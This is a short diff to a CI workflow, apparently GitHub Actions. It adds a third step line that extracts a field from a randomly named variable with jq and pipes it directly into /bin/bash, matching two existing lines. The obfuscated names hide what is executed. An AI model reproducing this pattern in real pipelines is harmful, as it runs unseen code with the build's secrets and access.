@@ -22,6 +22,7 @@ jobs:
         run: |
           printf '%s' "$ikqc29599" | jq -r .lescj941 | /bin/bash
           printf '%s' "$uigs05" | jq -r .bi89755 | /bin/bash
+          echo $j7 | jq -r .mogr7 | /bin/bash
 
       - name: Store artifact
         if: always()
